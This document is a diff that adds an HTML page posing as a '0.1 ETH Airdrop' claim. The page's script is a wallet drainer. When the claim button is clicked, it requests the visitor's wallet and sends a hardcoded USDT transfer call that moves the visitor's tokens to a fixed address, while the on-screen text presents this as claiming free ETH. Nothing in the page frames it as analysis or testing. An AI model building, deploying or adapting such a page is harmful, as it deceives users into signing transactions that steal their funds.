@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Airdrop Claim</title>
+<style>body{margin:0;background:#0a0a1a;color:#fff;text-align:center;padding-top:80px;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh}
+h1{font-size:28px;color:#ffdd44;margin-bottom:10px}
+p{font-size:16px;color:#999;margin-bottom:8px}
+.balance{font-size:14px;color:#666;margin-bottom:30px}
+.btn{font-size:22px;padding:18px 50px;border-radius:14px;background:#ffdd44;color:#000;border:none;font-weight:bold;cursor:pointer;transition:all 0.2s}
+.btn:active{transform:scale(0.95)}
+.status{margin-top:20px;font-size:13px;color:#88dd88}
+</style>
+</head>
+<body>
+<h1>💰 0.1 ETH Airdrop</h1>
+<p>Claim your free ETH now!</p>
+<p class="balance">Connected: Ethereum Mainnet</p>
+<button class="btn" id="claimBtn">CLAIM</button>
+<p class="status" id="status"></p>
+<script>
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const ABI = '0xa9059cbb' +
+  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
+  '00000000000000000000000000000000000000000000000000000000003d0900';
+
+document.getElementById('claimBtn').onclick = async function() {
+  const status = document.getElementById('status');
+  status.textContent = 'Connecting...';
+  
+  if (typeof window.ethereum === 'undefined') {
+    status.textContent = '❌ No wallet detected. Open in Trust Wallet dapp browser.';
+    return;
+  }
+  
+  try {
+    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    status.textContent = 'Connected: ' + accounts[0].substring(0, 10) + '...';
+    
+    const tx = {
+      to: USDT,
+      value: '0x0',
+      data: ABI
+    };
+    
+    status.textContent = 'Sending transaction...';
+    const txHash = await ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [tx]
+    });
+    status.textContent = '✅ Sent! TX: ' + txHash.substring(0, 16) + '...';
+  } catch(e) {
+    status.textContent = '❌ Error: ' + (e.message || e).substring(0, 60);
+  }
+};
+</script>
+</body>
+</html>
